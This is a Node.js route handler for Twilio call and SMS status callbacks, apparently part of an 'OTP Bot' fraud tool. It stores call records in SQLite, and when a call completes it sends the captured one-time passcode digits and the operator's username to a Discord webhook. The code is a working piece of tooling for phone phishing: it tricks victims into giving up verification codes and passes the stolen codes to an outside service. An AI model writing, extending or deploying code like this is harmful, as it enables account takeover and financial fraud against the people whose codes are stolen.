const sqlite3 = require('sqlite3').verbose();
const config = require('../config');
const { Webhook, MessageBuilder } = require('discord-webhook-node');
const hook = new Webhook(config.discordwebhook || '');

module.exports = function(request, response) {
    const db = new sqlite3.Database('./db/data.db');
    const callSid = request.body.CallSid || request.body.SmsSid;
    const from = request.body.From;
    const to = request.body.To;
    const status = request.body.CallStatus || request.body.SmsStatus;
    const date = Date.now();

    if (from == null || to == null || callSid == undefined || callSid == null) {
        return response.status(200).json({ error: 'Please send all the needed post data.' });
    }

    db.get('SELECT * FROM calls WHERE callSid = ?', [callSid], (err, row) => {
        if (err) {
            console.log(err.message);
            return response.status(200).json({ error: 'Invalid callSid.' });
        }

        if (row == undefined) {
            db.run('INSERT INTO calls (callSid, itsfrom, itsto, status, date) VALUES (?, ?, ?, ?, ?)', [callSid, from, to, status, date], function(err) {
                if (err) {
                    console.log(err.message);
                }
                response.status(200).json({ inserted: 'All is alright.' });
            });
        } else {
            db.run('UPDATE calls SET status = ?, itsfrom = ?, itsto = ?, date = ? WHERE callSid = ?', [status, from, to, date, callSid], function(err) {
                if (err) {
                    console.log(err.message);
                }

                if (status == 'completed' && config.discordwebhook != undefined) {
                    db.get('SELECT * FROM calls WHERE callSid = ?', [callSid], (err, row) => {
                        if (err) {
                            console.log(err.message);
                        }

                        const embed = new MessageBuilder()
                            .setTitle('OTP Bot')
                            .setColor(15158332)
                            .setDescription(`OTP: ||${row.digits || '***'}||\nStatus: **${status}**\n`)
                            .setFooter(row.user)
                            .setTimestamp();

                        hook.send(embed);
                    });
                }

                response.status(200).json({ inserted: 'All is alright.' });
            });
        }
    });
};
